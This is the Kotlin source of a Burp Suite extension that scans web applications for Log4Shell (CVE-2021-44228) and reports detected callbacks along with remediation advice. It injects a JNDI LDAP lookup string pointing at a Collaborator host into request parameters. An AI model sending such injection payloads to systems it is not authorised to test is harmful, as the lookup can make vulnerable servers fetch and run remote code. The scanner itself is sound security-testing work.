/*
 * This file is part of Log4Shell scanner for Burp Suite (https://github.com/silentsignal/burp-piper)
 * Copyright (c) 2021 Andras Veres-Szentkiralyi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

package burp

import java.net.URL
import java.util.*

const val NAME = "Log4Shell scanner"

class BurpExtender : IBurpExtender, IScannerCheck {

    private lateinit var callbacks: IBurpExtenderCallbacks
    private lateinit var helpers: IExtensionHelpers
    private lateinit var collaborator: IBurpCollaboratorClientContext

    override fun registerExtenderCallbacks(callbacks: IBurpExtenderCallbacks) {
        this.callbacks = callbacks
        helpers = callbacks.helpers
        collaborator = callbacks.createBurpCollaboratorClientContext()

        callbacks.setExtensionName(NAME)
        callbacks.registerScannerCheck(this)
    }

    override fun doPassiveScan(baseRequestResponse: IHttpRequestResponse?): MutableList<IScanIssue> =
            Collections.emptyList() // not relevant

    override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
        val payload = collaborator.generatePayload(true)
        val bytes = "\${jndi:ldap://$payload/s2test}".toByteArray()
        val request = insertionPoint!!.buildRequest(bytes)
        val poff = insertionPoint.getPayloadOffsets(bytes)
        val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
        // TODO launch a thread to handle background events
        return handleInteractions(hrr, poff, payload)
    }

    private fun handleInteractions(hrr: IHttpRequestResponse, poff: IntArray, payload: String): MutableList<IScanIssue> {
        val interactions = collaborator.fetchCollaboratorInteractionsFor(payload)
        if (interactions.isEmpty()) return Collections.emptyList()
        val iri = helpers.analyzeRequest(hrr)
        val markers = callbacks.applyMarkers(hrr, Collections.singletonList(poff), Collections.emptyList())
        return Collections.singletonList(object : IScanIssue {
            override fun getUrl(): URL = iri.url
            override fun getIssueName(): String = "Log4Shell (CVE-2021-44228)"
            override fun getIssueType(): Int = 0x08000000
            override fun getSeverity(): String = "High"
            override fun getConfidence(): String = "Tentative"
            override fun getIssueBackground(): String = "See <a href=\"https://www.lunasec.io/docs/blog/log4j-zero-day/\">CVE-2021-44228</a>"
            override fun getRemediationBackground(): String? = null
            override fun getRemediationDetail(): String = "Version 2.15.0 of log4j has been released without the vulnerability." +
                    "<br><br><code>log4j2.formatMsgNoLookups=true</code> can also be set as a mitigation on affected versions."
            override fun getHttpMessages(): Array<IHttpRequestResponse> = arrayOf(markers)
            override fun getHttpService(): IHttpService = hrr.httpService
            override fun getIssueDetail(): String {
                val sb = StringBuilder("<p>The application interacted with the Collaborator server in response to a request with a Log4Shell payload</p><ul>")
                for (interaction in interactions) {
                    sb.append("<li><b>")
                    sb.append(interaction.getProperty("type"))
                    sb.append("</b> at <b>")
                    sb.append(interaction.getProperty("time_stamp"))
                    sb.append("</b> from <b>")
                    sb.append(interaction.getProperty("client_ip"))
                    sb.append("</b></li>")
                }
                sb.append("</ul><p>This means that the web service (or another node in the network) is affected by this vulnerability. ")
                sb.append("However, actual exploitability might depend on an attacker-controllable LDAP being reachable over the network.</p>")
                return sb.toString()
            }
        })
    }

    override fun consolidateDuplicateIssues(existingIssue: IScanIssue?, newIssue: IScanIssue?): Int = 0 // TODO could be better
}
